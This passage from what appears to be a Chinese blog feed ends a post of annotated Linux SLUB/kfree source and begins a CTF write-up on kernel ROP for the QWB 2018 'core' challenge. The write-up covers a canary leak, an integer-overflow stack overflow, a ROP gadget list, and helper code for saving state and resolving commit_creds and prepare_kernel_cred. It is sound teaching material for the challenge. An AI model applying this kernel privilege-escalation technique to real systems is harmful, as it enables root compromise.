class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 慢速路径处理。 这可能仍然会被频繁调用，</span><br><span class="hljs-comment"> * 因为在大多数处理负载中对象的生命周期比 cpu slab更长。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所以我们还是尝试减少cache line的使用。 </span><br><span class="hljs-comment"> * 只需拿起板锁并释放该物品即可。 </span><br><span class="hljs-comment"> * 如果不需要额外的partial slab处理，那么我们可以立即返回。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br><br><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123; <span class="hljs-comment">//这里判断编译参数，以及对于kmem_cache的设置</span><br>free_to_partial_list(s, slab, head, tail, cnt, addr); <br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior); <span class="hljs-comment">//将tail头插在slab-&gt;freelist上</span><br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123; <span class="hljs-comment">//如果说（new中即将没有了使用的object或原slab的空闲块本身就为空）并且（该new没有被冻结）</span><br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123; <br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 之前没有出现在列表中，并且将部分为空。我们可以推迟列表移动而是冻结它。也就是链入cpu_slab</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 需要从list中删除 */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 推测性地获取list_lock。 </span><br><span class="hljs-comment"> * 如果 cmpxchg 不成功，那么我们可以删除 list_lock 而不进行任何处理.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则list_lock将与更新slab列表的其他处理器同步。</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br><br>&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>)); <span class="hljs-comment">//这里的判断条件是只要满足slab-&gt;freelist == prior 并且满足slab-&gt;counters == counters ，然后将其分别赋值为head和new.counters,然后就继续运行</span><br><span class="hljs-keyword">if</span> (likely(!n)) &#123;<span class="hljs-comment">//这里分空表示上面的do-while中没有运行到从list删除的部分</span><br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123; <span class="hljs-comment">//如果曾经被冻结</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 未采取列表锁定，因此不需要列表活动。</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 如果我们刚刚冻结了该slab，我们就将他放入cpu的部分列表</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 如果slab上的对象都是空闲的并且slab_alloc_node的部分列表数量大于最小的限制</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial)) <br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 留在slab中的objects。 如果之前不在partial list中，则添加它。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123; <span class="hljs-comment">//prior不为空说明slab本来应该在partial链表上 </span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//为空则说明在full链表</span><br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab); <span class="hljs-comment">//释放这一张slab</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-kfree相关"><a href="#5-kfree相关" class="headerlink" title="5.kfree相关"></a>5.kfree相关</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - free previously allocated memory</span><br><span class="hljs-comment"> * @object: pointer returned by kmalloc() or kmem_cache_alloc()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If @object is NULL, no operation is performed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object))) <span class="hljs-comment">//对于传入指针的检测</span><br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="virt-to-folio"><a href="#virt-to-folio" class="headerlink" title="virt_to_folio"></a>virt_to_folio</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过我们的虚拟地址来获得我们相应物理地址所对应的page结构体</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * page_folio - Converts from page to folio.</span><br><span class="hljs-comment"> * @p: The page.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 每个page都是folio的一部分。 不能在 NULL 指针上调用此函数。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 上下文：@page 上不需要引用，也不需要锁定。 </span><br><span class="hljs-comment"> * 如果调用者不持有引用，则此调用可能会与作品集拆分竞争，</span><br><span class="hljs-comment"> * 因此在获得作品集上的引用后，应重新检查作品集是否仍包含此页面。</span><br><span class="hljs-comment"> * Return: 包含该page的folio结构体</span><br><span class="hljs-comment"> */</span><br>#define page<span class="hljs-constructor">_folio(<span class="hljs-params">p</span>)</span>(<span class="hljs-constructor">_Generic((<span class="hljs-params">p</span>)</span>,\<br>const <span class="hljs-keyword">struct</span> page *:(const <span class="hljs-keyword">struct</span> folio *)<span class="hljs-constructor">_compound_head(<span class="hljs-params">p</span>)</span>, \<br><span class="hljs-keyword">struct</span> page *:(<span class="hljs-keyword">struct</span> folio *)<span class="hljs-constructor">_compound_head(<span class="hljs-params">p</span>)</span>))<br></code></pre></td></tr></table></figure><p>下面是一段folio的介绍</p><blockquote><p>Linux 中的每个物理地址都有一个 struct page。 结构页是一种相当弱的数据类型； 当页面实际上是尾页并且没有映射时，很容易查看（例如）页面-&gt;映射。 Folios 是分离 struct page 的某些角色的开始。 从概念上讲，folios 获取 struct page 的内容（尾页部分除外）并将它们移动到 struct folio 中。 这并不是补丁集实际要做的事情，因为我还不够受虐狂，无法一次性完成所有这些更改。</p><p>我们可以（而且应该）走得更远。 我们需要了解内存（当前）是如何分配和使用的。 映射到用户空间的任何内存都需要有脏位和锁定位，有引用计数和映射计数。</p></blockquote><p>引用的kernelnewbie,不知道他在说什么，初步判定是用来优化以往的page结构提出的新特性，这里是返回了folio结构体供我们kfree使用</p><h3 id="free-large-kmalloc"><a href="#free-large-kmalloc" class="headerlink" title="free_large_kmalloc"></a>free_large_kmalloc</h3><p>大页面则使用伙伴系统的接口，将其直接释放至伙伴系统之中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmem-cache-free"><a href="#kmem-cache-free" class="headerlink" title="__kmem_cache_free"></a>__kmem_cache_free</h3><p>调用了另一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="slab-free-1"><a href="#slab-free-1" class="headerlink" title="slab_free"></a>slab_free</h3><p>这里也是直接调用了我们之前所讲述的较为关键的释放函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-参考"><a href="#1-参考" class="headerlink" title="-1.参考"></a>-1.参考</h2><p><a href="http://arttnba3.cn/">arttnba3师傅博客</a></p><p><a href="https://www.kernel.org/">kernel doc 中文版</a></p><p><a href="https://kernelnewbies.org/">kernel new bies</a></p><p><a href="https://lwn.net/">LWN</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>kernel</tag>
      
      <tag>source</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux-Kernel-0x02-Practice</title>
    <link href="/2023/06/24/Linux-Kernel-0x02-Practice/"/>
    <url>/2023/06/24/Linux-Kernel-0x02-Practice/</url>
    
    <content type="html"><![CDATA[<h1 id="一-、Kernel-ROP"><a href="#一-、Kernel-ROP" class="headerlink" title="一 、Kernel ROP"></a>一 、Kernel ROP</h1><p>其大致思想类似于<code>userland</code>部分的ROP，唯一区别就是咱们需要注意现场的保存与还原即可:)</p><h2 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h2><h3 id="0-反编译代码分析"><a href="#0-反编译代码分析" class="headerlink" title="0. 反编译代码分析"></a>0. 反编译代码分析</h3><p>文件里面包含了这几个文件<br>        <code>bzImage</code>,<code>core.cpio</code>,<code>start.sh</code>,<code>vmlinux</code><br>先看看start.sh</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">qemu-system-x86_64 \<br>-m <span class="hljs-number">128</span>M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append <span class="hljs-string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \<br>-s \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p>可以看到咱们这儿题目采用了kaslr ，有地址随机，所以咱们需要泄露地址，大致思路和用户态一致。这里还注意那就是从ctfwiki上面下载下来的题目是-m 64M,这里会出现运行不了虚拟机的情况，所以咱们改为128M即可，这是内存大小的定义，太小了跑不动。</p><p>之后咱们再看看文件系统解压后得到的init脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/bin/sh<br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mv <span class="hljs-built_in">exp</span>.c /<br>mount -vt devpts -o gid=<span class="hljs-number">4</span>,mode=<span class="hljs-number">620</span> none /dev/pts<br>chmod <span class="hljs-number">666</span> /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br>echo <span class="hljs-number">1</span> &gt; /proc/sys/kernel/kptr_restrict<br>echo <span class="hljs-number">1</span> &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.15</span> netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span><br>route add <span class="hljs-keyword">default</span> gw <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.2</span> <br>insmod /core.ko<br><span class="hljs-meta">#setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><br>poweroff -d <span class="hljs-number">120</span> -f &amp;<br>setsid /bin/cttyhack setuidgid <span class="hljs-number">1000</span> /bin/sh<br>echo <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d <span class="hljs-number">0</span>  -f<br></code></pre></td></tr></table></figure><p>从中我们可以看到文件系统中insmod了一个core.ko，一般来讲这就是漏洞函数了，还有咱们可以添加<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>这一句来使得我们进入虚拟机的时候就是root权限，大伙不必惊慌，这里是因为咱们是再本地需要进行调试，所以init脚本任我们改，start脚本也是，咱们可以直接把kalsr关了也行，但关了并不代表咱们不管，咱们这一举动主要是为了方便调试的，最终打远程还是人家说了算，咱们值有一个exp能提交。<br>接着分析init，这里还发现开始时内核符号表被复制了一份到<code>/tmp/kalsyms</code>中，利用这个我们可以获得内核中所有函数的地址，还有个恶心的地方那就是这里开启了定时关机，咱们可以把这给先注释掉<br><code>poweroff -d 120 -f &amp;</code></p><p>进入漏洞模块的分析</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/42166d224f4a20a438bb7e05d5529822730ed04f.jpg"></p><p>这里可以看到有canary和NX，所以咱们通过ROP的话需要进行canary泄露。<br>接下来咱们分析相关函数init_moddule</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/a9d3fd1f4134970ac9d052edd0cad1c8a6865d55.jpg"></p><p>可以看到模块加载的初期会创建一个名为<code>core</code>的进程，在虚拟机中在&#x2F;proc目录下<br>在看看比较重要的ioctl函数</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d162f5ed8a3b6deb48f8d546453.jpg"></p><p>可以看出有三个模式选择，分别点入相关函数看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77094b36acaf2edd18640b2bc81001e93801935f.jpg"></p><p>这里的read函数就是向用户指定的地址从off偏移地址写入64个字节.<br>而从ioctl中第二个case可以看到咱们居然可以设置off，所以我们可以通过设置偏移来写入canary的值，而我们从ida中可以看到咱们的canary是位于这里</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/a5c27d1ed21b0ef40362da9c98c451da80cb3e6d.jpg"></p><p>可以知道相差对于v5相差0x40，所以咱们设置的off也是0x40</p><p>我们还可以来看看file_operations,(不秦楚的大伙可以看看我的上一篇环境搭建的文章)，可以看到他只实现了write，ioctl，release的系统调用：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd4da7a7e44c24ab18962b3777.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6d81800a19d8bc3e40f74408c78ba61ea9d34571.jpg"></p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7aec54e736d12f2e7ffceca20ac2d56284356873.jpg"></p><p>我们再来看看其他函数，先看core_write</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8694a4c27d1ed21b193c6c27e86eddc450da3f7e.jpg"><br>这里可以知道他总共可以向name这个地址写入0x800个字节，心动<br>我们再来看看ioctl中第三个选项的core_copy_func</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/810a19d8bc3eb135c137f579e31ea8d3fc1f4404.jpg"><br>发现他可以从name上面拷贝数据到达栈上，然后这个判断存在着整形溢出，这里如果咱传个负数就可以达成效果了。</p><p>既然咱们可以在栈上做手脚，那么我们就可以利用ROP的方式了，首先找几个gadget，这里的gadget是需要在vmlinux中寻找，我的推荐是用</p><pre><code class="hljs">objdump -d ./vmlinux &gt; ropgadget \cat ropgadget | grep &quot;pop rdi; ret&quot;</code></pre><p>这样的类型进行寻找</p><h3 id="1-寻找gadget"><a href="#1-寻找gadget" class="headerlink" title="1.寻找gadget"></a>1.寻找gadget</h3><p>如图：<br>对于上面所说的比较关键的两个函数<code>commit_creds</code>以及<code>prepare_kernel_cred</code>,我们在vmlinux中去寻找他所加载的的地址<br>然后我们可以看看ropgadget文件<br><img src="http://imgsrc.baidu.com/super/pic/item/aec379310a55b319d78ccdb706a98226cefc17fe.jpg"><br>从中咱们可以看到其中即我们所需要的gadget(实际上就是linux内核镜像所使用的汇编代码)，此时我们再通过linux自带的grep进行搜索，个人认为还是比较好用的，用<code>ropgadget</code>或者是<code>ropper</code>来说都可以，看各位师傅的喜好来.具体使用情况如下：<br><img src="http://imgsrc.baidu.com/super/pic/item/b8389b504fc2d562427a9f2fa21190ef77c66c86.jpg"><br>以此手法获得两个主要函数的地址后，此刻若咱们在exp中获得这两个函数的实际地址，然后将两者相减即可得到KASLR的偏移地址。<br>自此咱们继续搜索别的gadget，我们此刻需要的gadget共有如下几个：</p><pre><code class="hljs">swapgs; popfq;  ret;mov rdi, rax;  call rdx; pop rdx; ret;  pop rdi; ret;   pop rcx; ret; iretq</code></pre><p>师傅们可以用上述方法自行寻找.</p><h3 id="2-自行构造返回状态"><a href="#2-自行构造返回状态" class="headerlink" title="2. 自行构造返回状态"></a>2. 自行构造返回状态</h3><p>虽然咱们的<strong>提权</strong>是在内核态当中，但我们最终还是需要返回用户态来得到一个root权限的shell，所以当我们进行栈溢出rop之后还需要利用swapgs等保存在内核栈上的寄存器值返回到应得的位置，但是如何保证返回的时候不出错呢，对，那就只能在调用内核态的时候将即将保存的正确的寄存器值先保存在咱们自己申请的值里面，这样就方便咱们在rop链结尾填入他们实现返回不报错。既然涉及到了保存值，那我们就需要内嵌汇编代码来实现此功能，代码如下，这也可以视为一个通用代码；</p><pre><code class="hljs">size_t user_cs, user_ss,user_rflags,user_sp;//int fd = 0;        // file pointer of process &#39;core&#39;void saveStatus()&#123;  __asm__(&quot;mov user_cs, cs;&quot;          &quot;mov user_ss, ss;&quot;          &quot;mov user_sp, rsp;&quot;          &quot;pushf;&quot;          &quot;pop user_rflags;&quot;          );  puts(&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;);&#125;</code></pre><p>大伙学到了内核pwn，那汇编功底自然不必说，我就不解释这段代码功能了。</p><h3 id="3-攻击思路"><a href="#3-攻击思路" class="headerlink" title="3. 攻击思路"></a>3. 攻击思路</h3><p>现在开始咱们的攻击思路思考，在上面介绍各个函数的时候我也稍微讲了点。我们所做的事主要如下：</p><blockquote><ol><li><p>利用ioctl中的选项2.修改off为0x40</p></li><li><p>利用core_read,也就是ioctl中的选项1,可将局部变量v5的off偏移地址打印,经过调试可发现这里即为canary</p></li><li><p>当咱们打印了canary,现在即可进行栈溢出攻击了,但是溢出哪个栈呢,我们发现ioctl的第三个选项中调用的函数 <code>core_copy_func</code>,会将bss段上的name输入在栈上,输入的字节数取决于咱们传入的数字,并且此时他又整型溢出漏洞,好,就决定冤大头是他了</p></li><li><p>core.ko 所实现的系统调用write可以发现其中可以将我们传入的值写到bss段中的name上面,天助我也,所以咱们就可以在上面适当的构造rop链进行栈溢出了</p></li></ol></blockquote><p>大伙看到这里是不是觉得有点奇怪,欸,刚才不是说要泄露地址码,这兄弟是不是讲错了,就这?大家不要慌,我这正要讲解,从上面的init脚本中我们可以看到这一句:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>kallsyms &gt; <span class="hljs-regexp">/tmp/</span>kallsyms<br></code></pre></td></tr></table></figure><p>其中 &#x2F;proc&#x2F;kallsyms中包含了内核中所有用到的符号表,而处于用户态的我们是不能访问的,所以出题人贴心的将他输出到了&#x2F;tmp&#x2F;kallsyms中,这就使得我们在用户态也依然可以访问了,所以我们还得在exp中写一个文件遍历的功能,当然这对于学过系统编程的同学并不在话下,(可是我上这课在划水….)<br>这里贴出代码给大伙先看看</p><pre><code class="hljs">void get_function_address()&#123;        FILE* sym_table = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);        // including all address of kernel functions,just like the user model running address.        if(sym_table == NULL)&#123;                printf(&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;);                exit(1);        &#125;        size_t addr = 0;        char type[0x10];        char func_name[0x50];        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.        while(fscanf(sym_table, &quot;%llx%s%s&quot;, &amp;addr, type, func_name))&#123;                if(commit_creds &amp;&amp; prepare_kernel_cred)                // two addresses of key functions are all found, return directly.                        return;                if(!strcmp(func_name, &quot;commit_creds&quot;))&#123;                // function &quot;commit_creds&quot; found                        commit_creds = addr;                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;, commit_creds);                &#125;else if(!strcmp(func_name, &quot;prepare_kernel_cred&quot;))&#123;                        prepare_kernel_cred = addr;                        printf(&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;, prepare_kernel_cred);                &#125;        &#125;&#125;</code></pre><p>当知道exp思路之后,其他的一切就简单起来,只需要看懂他然后实现即可.</p><h3 id="4-gdb调试qemu中内核基本方法"><a 